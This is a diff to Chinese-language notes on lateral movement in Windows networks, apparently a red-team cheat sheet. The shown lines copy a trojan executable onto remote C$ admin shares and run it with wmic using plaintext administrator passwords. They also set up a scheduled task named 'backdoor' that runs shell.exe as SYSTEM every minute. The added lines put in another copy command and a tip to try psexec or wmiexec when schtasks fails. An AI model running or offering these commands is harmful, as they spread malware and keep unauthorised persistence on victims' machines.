@@ -13,6 +13,7 @@
     
     在本地传个马，copy过去    
     shell copy C:\\Windows\\Temp\\ma.exe \\192.168.10.23\c$\Windows\Temp\ma.exe
+    shell copy 123.exe \\192.168.250.50\c$
       
     wmic远程执行 
     shell wmic /node:192.168.10.23 /user:Administrator /password:Psft24680!!@@62## process call create "cmd.exe /c C:\\Windows\\Temp\\ma.exe"
@@ -126,6 +127,8 @@
      在没有建立ipc连接前提，可以添加账户密码方式进行启动shell.exe木马（启动成功前提：具有管理员权限）
      
      schtasks /create /s 192.168.183.130 /u administrator /p Liu78963 /tn backdoor /sc minute /mo 1 /tr c:\shell.exe /ru system /f
+     
+     要是碰见schtasks启动不成功，可以尝试psexec、wmiexec等工具
  
       参考：https://cloud.tencent.com/developer/article/1743842
  
